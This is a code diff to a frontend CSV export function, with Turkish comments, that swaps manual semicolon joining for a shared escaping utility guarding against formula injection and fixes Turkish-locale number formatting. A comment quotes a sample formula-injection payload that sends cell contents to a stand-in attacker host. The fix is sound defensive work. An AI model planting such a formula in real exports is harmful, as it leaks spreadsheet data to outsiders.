@@ -42,6 +42,7 @@
   import { useAuthStore } from "@/stores/auth";
   import { useLogisticsStore } from "@/stores/logistics";
   import { usePricingStore } from "@/stores/pricing";
+  import { buildCsv, csvNumber } from "@/utils/csv";
 
   /**
    * **K3 container** — simülasyonu gerçek veriye bağlar.
@@ -87,7 +88,18 @@
    * CSV dışa aktarım — gerçek dosya.
    *
    * Excel Türkçe yerelde noktalı virgülü ayraç sayıyor; virgülle üretilen
-   * dosya tek sütuna düşüyor ve "bozuk indi" diye geri geliyor.
+   * dosya tek sütuna düşüyor ve "bozuk indi" diye geri geliyor. Ayraç bu
+   * yüzden `;` ve KAÇIŞA DA geçiriliyor (`buildCsv` ikisini birlikte alır).
+   *
+   * ORTAK UTIL ŞART (Security denetimi, 2026-08-28):
+   *   Hücreler eskiden elle `join(";")` ediliyordu — ne RFC 4180 kaçışı ne
+   *   formül koruması vardı. `applied_rule` ve `carrier_account` SERBEST
+   *   METİN (kural adını kullanıcı yazıyor) ve ekran satıcıya açık; ölçüldü:
+   *   `=HYPERLINK("https://evil.tld/?d="&A1;"Ac")` dosyaya DEĞİŞMEDEN
+   *   yazılıyor ve okuyanın Excel'inde çalışan bir formül oluyordu.
+   *
+   * TUTARLAR `csvNumber`dan geçiyor: ham `46239.2` Türkçe Excel'de 462392
+   * okunuyor (`.` binlik ayracı) — 10.000 kat şişme.
    */
   function exportCsv() {
     const quotes = store.simulation?.quotes ?? [];
@@ -101,8 +113,18 @@
       "applied_rule",
       "available",
     ];
-    const satirlar = quotes.map((q) => basliklar.map((k) => q[k] ?? "").join(";"));
-    const icerik = "﻿" + [basliklar.join(";"), ...satirlar].join("\n");
+    const satirlar = quotes.map((q) => [
+      q.carrier_account ?? "",
+      q.carrier ?? "",
+      csvNumber(q.customer_charge),
+      csvNumber(q.tax_amount),
+      csvNumber(q.total_with_tax),
+      q.applied_rule ?? "",
+      q.available ?? "",
+    ]);
+    // BOM'u çağıran ekliyor (`buildCsv` bilerek BOM'suz) — Excel'in UTF-8
+    // tanıması için gerekli, mevcut desen: ReportCenterView.
+    const icerik = "﻿" + buildCsv(basliklar, satirlar, { delimiter: ";" });
     const blob = new Blob([icerik], { type: "text/csv;charset=utf-8" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
